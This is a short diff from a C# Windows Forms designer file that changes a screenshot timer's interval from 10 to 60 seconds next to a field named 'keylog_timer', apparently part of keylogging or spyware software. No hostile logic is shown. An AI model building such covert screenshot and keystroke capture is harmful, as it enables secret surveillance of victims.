@@ -62,7 +62,7 @@
             // 
             // Sceenshot_timer
             // 
-            this.Sceenshot_timer.Interval = 10000;
+            this.Sceenshot_timer.Interval = 60000;
             this.Sceenshot_timer.Tick += new System.EventHandler(this.Sceenshot_timer_Tick);
             // 
             // keylog_timer
